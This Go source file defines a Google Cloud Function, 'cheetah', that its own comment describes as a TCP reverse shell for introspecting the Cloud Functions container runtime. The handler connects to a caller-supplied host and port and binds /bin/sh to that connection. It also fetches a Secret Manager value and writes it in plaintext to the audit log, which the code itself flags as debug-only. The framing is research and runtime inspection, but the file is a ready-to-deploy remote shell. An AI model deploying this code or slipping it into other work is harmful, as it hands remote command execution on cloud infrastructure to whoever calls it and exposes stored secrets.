/*
Package cheetah is a Go function that can be deployed to the Google Cloud Platform to establish a TCP reverse shell for the purposes of introspecting the Cloud Functions container runtime.

References:
https://github.com/sathish09/rev2go
https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e
*/
package cheetah

import (
	"cloud.google.com/go/logging"
	secretmanager "cloud.google.com/go/secretmanager/apiv1beta1"
	"context"
	"encoding/json"
	"fmt"
	secretmanagerpb "google.golang.org/genproto/googleapis/cloud/secretmanager/v1beta1"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"time"
)

func respondWithError(w http.ResponseWriter, errMsg string, statusCode int) {
	type Response struct {
		Message string `json:"message"`
	}

	response := &Response{Message: errMsg}
	responseJSON, _ := json.Marshal(response)
	w.WriteHeader(statusCode)
	fmt.Fprintf(w, "%s", responseJSON)
}

// Cheetah establishes a TCP reverse shell connection.
func Cheetah(w http.ResponseWriter, r *http.Request) {
	timeout, err := strconv.ParseUint(os.Getenv("X_GOOGLE_FUNCTION_TIMEOUT_SEC"), 10, 64)

	//Audit logging
	writeLog(1, "Startup: The Cheetah is running.")

	//Read basic secret to produce normal audit log activity
	secret := getSecret("cheetah-database-pass")
	//NOTE: DON'T DO THIS IN REAL LIFE. BAD IDEA TO LOG SECRETS
	//DEBUG ONLY: Make sure it found the value
	writeLog(8, fmt.Sprintf("Secret value: %s", secret))

	if err != nil {
		writeLog(2, "Invalid request: Failed to parse function timeout.")
		respondWithError(w, err.Error(), 500)
		return
	}

	// For some reason, a timeout doesn't send a response. Force a response by exiting the process.
	time.AfterFunc(time.Duration(timeout)*time.Second, func() {
		writeLog(3, "Timeout: Function timeout occurred.")
		os.Exit(0)
	})

	type Response struct {
		Error string
	}

	host := r.URL.Query().Get("host")
	port := r.URL.Query().Get("port")

	if host == "" || port == "" {
		writeLog(2, "Invalid request: Missing hort or port parameter.")
		respondWithError(w, "Must provide the host and port for the target TCP server as query parameters.", 400)
		return
	}

	portNum, err := strconv.ParseUint(port, 10, 64)

	if err != nil {
		writeLog(2, fmt.Sprintf("Invalid request: Port number %s is not valid.", port))
		respondWithError(w, err.Error(), 500)
		return
	}

	connString := fmt.Sprintf("%s:%d", host, portNum)

	conn, err := net.Dial("tcp", connString)

	if err != nil {
		writeLog(4, err.Error())
		respondWithError(w, err.Error(), 500)
		return
	}

	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
	cmd.Run()

	respondWithError(w, "Connection terminated from client.", 500)
	conn.Close()

	writeLog(5, "Shutdown: The Cheetah is tired.")
}

//Stackdriver logging util
func writeLog(id int, message string) {
	ctx := context.Background()

	// Sets your Google Cloud Platform project ID.
	projectID := os.Getenv("X_GOOGLE_GCLOUD_PROJECT")

	// Creates a client.
	client, err := logging.NewClient(ctx, projectID)
	if err != nil {
		log.Fatalf("Failed to create logging client: %v", err)
	}

	// Sets the name of the log to write to.
	logName := "cheetah-audit-log"

	// Selects the log to write to.
	logger := client.Logger(logName)

	// Adds an entry to the log buffer.
	logger.Log(logging.Entry{Payload: fmt.Sprintf("{\"EventId\": \"%d\", \"Message\": \"%s\"}", id, message)})

	// Closes the client and flushes the buffer to the Stackdriver Logging
	// service.
	if err := client.Close(); err != nil {
		log.Fatalf("Failed to close client: %v", err)
	}

	fmt.Printf("Logged: %v\n", message)
}

// Secrets manager access
func getSecret(name string) (value string) {
	// Sets your Google Cloud Platform project ID.
	projectID := os.Getenv("X_GOOGLE_GCLOUD_PROJECT")
	secretPath := fmt.Sprintf("projects/%s/secrets/%s/versions/latest", projectID, name)

	// Create the client.
	ctx := context.Background()
	client, err := secretmanager.NewClient(ctx)
	if err != nil {
		writeLog(7, fmt.Sprintf("Error: Failed to create secretmanager client: %s", err.Error()))
		return ""
	}

	// Build the request.
	req := &secretmanagerpb.AccessSecretVersionRequest{
		Name: secretPath,
	}

	// Call the API.
	result, err := client.AccessSecretVersion(ctx, req)

	if err != nil {
		writeLog(7, fmt.Sprintf("Error: Unable to read the secret. %s", err.Error()))
		return ""
	}

	//Return the value
	return string(result.Payload.Data)
}
